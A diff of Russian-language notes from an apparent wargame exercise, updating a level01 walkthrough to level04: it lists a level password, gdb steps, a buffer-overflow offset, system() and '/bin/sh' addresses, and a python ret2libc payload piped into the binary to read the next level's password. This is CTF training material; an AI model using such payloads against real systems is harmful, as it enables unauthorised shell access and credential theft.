@@ -1,16 +1,17 @@
 1. Логин level04:kgv3tkEb9h2mLkRsPkXRfc2mHbjMxQzvb2FrgKkf
-2. Ревёрс инженеринг disas main; disas verify_user_name; disas verify_password;
-3. Сам код никак нас не приведёт к получению прав, но есть момент с переполнением. Надо подложить исполнение bin/sh в стек
-3. Подсчитываем сколько символов считывает программа и где она сломается 0x37634136
+2. Ревёрс инженеринг
+3. Этот уровень похож на level01, но буфер без ограничений
+4. Проблема в том, что есть дочерний процесс, но чтобы в него зайти достаточно прописать в gdb
+set follow-fork-mode child
+3. Подсчитываем сколько символов считывает программа и где она сломается 0x41326641 offset -> 156
 https://wiremask.eu/tools/buffer-overflow-pattern-generator/
 4. Находим адрес функции system,  info functions system
 0xf7e6aed0
-5. Находим адрес строки /bin/sh, запускаем программу через gdb,  info proc map -> find  0xf7e2b000, 0xf7fd0000, "bin/sh"
+5. Находим адрес строки /bin/sh, запускаем программу через gdb,  info proc map -> find  0xf7e2b000, 0xf7fd0000, "/bin/sh"
 0xf7f897ec
-5. Готовим payload. 80 символов offset, адрес функции и адрес /bin/sh, сохраним в /tmp/l1
-python -c  'print "dat_wil\n" + "X"*80 + "\xd0\xae\xe6\xf7" + "0000" + "\xec\x97\xf8\xf7"' > /tmp/l1
-6. Подставляем в input level01 
-cat /tmp/l1 /dev/stdin | ./level01
-7. Забираем .pass из level04
-cd ../level02
-cat .pass
+5. Готовим payload. 156 символов offset, адрес функции и адрес /bin/sh, сохраним в /tmp/l4
+python -c  'print "X"*156 + "\xd0\xae\xe6\xf7" + "0000" + "\xec\x97\xf8\xf7"' > /tmp/l4
+6. Подставляем в input level04
+cat /tmp/l4 /dev/stdin | ./level04
+7. Забираем .pass из level05
+cat /home/users/level05/.pass
